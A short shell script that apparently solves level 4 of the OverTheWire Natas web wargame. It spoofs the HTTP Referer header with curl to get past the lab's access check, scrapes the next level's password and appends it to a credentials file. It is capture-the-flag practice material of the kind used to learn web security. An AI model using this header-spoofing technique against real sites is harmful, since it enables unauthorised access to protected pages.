#!/bin/sh

level="natas4"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)
referer="http://natas5.natas.labs.overthewire.org/"

echo -n "[i] Target: $url\n"
next_password=$(curl -u $web_auth --referer $referer -sL $url 2>&1 | grep "password for natas5" | cut -d " " -f 8)
echo -n "[+] Password for the next level: $next_password\n"
echo "natas5:$next_password" >> ./credentials
